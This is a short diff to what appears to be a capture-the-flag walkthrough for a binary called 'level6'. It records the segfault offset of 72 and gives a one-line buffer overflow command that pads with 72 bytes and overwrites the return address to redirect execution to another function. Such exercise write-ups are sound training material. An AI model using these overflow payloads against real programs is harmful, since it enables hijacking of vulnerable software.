@@ -25,5 +25,6 @@ decompile using ghidras
                 return;
             }
 ```
-Like before buffer overlof to jump to other function:\
+We find found the segfault a index 72\
+Like before buffer overflow to jump to other function:\
 `./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')` 
